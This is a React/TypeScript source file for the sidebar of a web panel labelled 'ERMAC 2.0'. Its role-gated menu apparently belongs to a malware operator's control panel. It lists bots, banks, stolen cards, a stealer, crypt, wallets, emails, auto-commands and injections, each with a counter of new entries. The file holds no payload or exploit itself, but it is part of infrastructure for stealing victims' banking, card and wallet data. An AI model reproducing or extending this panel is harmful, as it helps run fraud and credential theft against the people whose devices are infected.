import React from "react";
import {Divider, Layout, Modal, Space} from "antd";
import {
    LogoutOutlined,
} from "@ant-design/icons";
import {NavLink, useLocation} from "react-router-dom";
import {logout} from "../../Store/Auth/Actions";
import {useDispatch, useSelector} from "react-redux";
import {hasAccess} from "../../Util/hasAccess";
import {AppState} from "../../Store/RootReducer";

const {Sider} = Layout;

interface SidebarProps {
    collapsedState: boolean,
    collapseAction: () => void,
}

const Sidebar: React.FC<SidebarProps> = (props: SidebarProps) => {
    const dispatch = useDispatch();

    const authReducer = useSelector((state: AppState) => state.auth);
    const countsReducer = useSelector((state: AppState) => state.counts);

    const location = useLocation();

    return (
        <>
            <Sider
                trigger={null}
                collapsible
                className={props.collapsedState ? "menu-sidebar show" : "menu-sidebar"}
                width={220}
            >
                <div className="menu-logo">
                    ERMAC <sup>2.0</sup>
                </div>

                <div className="sider-group">
                    <div className="panel-user">
                        <div className="panel-user-inner">
                            <div className="panel-user-image" style={{
                                backgroundImage: `url(${process.env.PUBLIC_URL}/userpic.jpg)`,
                            }}/>
                            <div className="panel-user-body">
                                <div className="panel-user-name">{authReducer.user.name}</div>
                                <div className="panel-user-login">{authReducer.user.role}</div>
                            </div>
                        </div>
                    </div>

                    <Space direction="vertical" size={0} style={{width: "100%"}} className="menu-nav">
                        {hasAccess(authReducer.user, "bots.list") && (
                            <NavLink className="menu-link" to="/" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-bots" style={{color: "#854eca"}} />
                                    </span> Bots
                                </Space>

                                {location.pathname !== "/bots" && countsReducer.isLoaded && countsReducer.bots > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.bots}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "banks.list") && (
                            <NavLink className="menu-link" to="/banks" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-banks" style={{color: "#e89a3c"}} />
                                    </span> Banks
                                </Space>

                                {location.pathname !== "/banks" && countsReducer.isLoaded && countsReducer.banks > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.banks}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "credit_cards.list") && (
                            <NavLink className="menu-link" to="/cards" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-cards" style={{color: "#33bcb7"}} />
                                    </span> Cards
                                </Space>

                                {location.pathname !== "/cards" && countsReducer.isLoaded && countsReducer.credit_cards > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.credit_cards}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "stealers.list") && (
                            <NavLink className="menu-link" to="/stealer" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-stealers" style={{color: "#e8b339"}} />
                                    </span> Stealer
                                </Space>

                                {location.pathname !== "/stealer" && countsReducer.isLoaded && countsReducer.stealers > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.stealers}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "crypt.list") && (
                            <NavLink className="menu-link" to="/crypt" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-crypt" style={{color: "#3c9ae8"}} />
                                    </span> Crypt
                                </Space>

                                {location.pathname !== "/crypt" && countsReducer.isLoaded && countsReducer.crypt > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.crypt}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "shops.list") && (
                            <NavLink className="menu-link" to="/shops" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-shops" style={{color: "#5273e0"}} />
                                    </span> Shops
                                </Space>

                                {location.pathname !== "/shops" && countsReducer.isLoaded && countsReducer.shops > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.shops}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "emails.list") && (
                            <NavLink className="menu-link" to="/email" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-emails" style={{color: "#e0529c"}} />
                                    </span> Email
                                </Space>

                                {location.pathname !== "/email" && countsReducer.isLoaded && countsReducer.emails > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.emails}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "wallets.list") && (
                            <NavLink className="menu-link" to="/wallet" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-wallets" style={{color: "#3c9ae8"}} />
                                    </span> Wallet
                                </Space>

                                {location.pathname !== "/wallet" && countsReducer.isLoaded && countsReducer.wallets > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.wallets}</span>
                                )}
                            </NavLink>
                        )}

                        <Divider />

                        {hasAccess(authReducer.user, "autoCommands.list") && (
                            <NavLink className="menu-link" to="/auto_commands" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-bots" style={{color: "#e89a3c"}} />
                                    </span> AutoCommands
                                </Space>

                                {location.pathname !== "/banks" && countsReducer.isLoaded && countsReducer.banks > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.banks}</span>
                                )}
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "injections.list") && (
                            <NavLink className="menu-link" to="/injections" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-injections" style={{color: "#6abe39"}} />
                                    </span> Injections
                                </Space>


                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "users.list") && (
                            <NavLink className="menu-link" to="/users" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-users" style={{color: "#a9d134"}} />
                                    </span> Users
                                </Space>
                            </NavLink>
                        )}

                        <Divider />

                        {/*
                        <NavLink className="menu-link" to="/settings" onClick={props.collapseAction}>
                            <Space size={10}>
                                <span className="anticon">
                                    <span className="icon-sidebar-settings" style={{color: "#e87040"}} />
                                </span> Settings
                            </Space>
                        </NavLink>
                        */}

                        {hasAccess(authReducer.user, "permissions.list") && (
                            <NavLink className="menu-link" to="/permissions" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-permissions" style={{color: "#e87040"}} />
                                    </span> Permissions
                                </Space>
                            </NavLink>
                        )}

                        {hasAccess(authReducer.user, "stats.list") && (
                            <NavLink className="menu-link" to="/stats" onClick={props.collapseAction}>
                                <Space size={10}>
                                    <span className="anticon">
                                        <span className="icon-sidebar-stats" style={{color: "#e87040"}} />
                                    </span> General stats
                                </Space>
                            </NavLink>
                        )}

                        <div
                            className="menu-link"
                            onClick={() => {
                                Modal.success({
                                    title: "Confirm",
                                    content: "Do you want to exit?",
                                    icon: <LogoutOutlined/>,
                                    centered: true,
                                    closable: true,
                                    onOk: () => {
                                        dispatch(logout());
                                    },
                                    okText: "Logout",
                                    okButtonProps: {
                                        danger: true,
                                    },
                                });
                            }}
                            style={{cursor: "pointer"}}
                        >
                            <Space size={10}>
                                <span className="anticon">
                                    <span className="icon-sidebar-logout" style={{color: "#e84749"}} />
                                </span> Logout
                            </Space>
                        </div>
                    </Space>
                </div>
            </Sider>
        </>
    );
};

export default Sidebar;
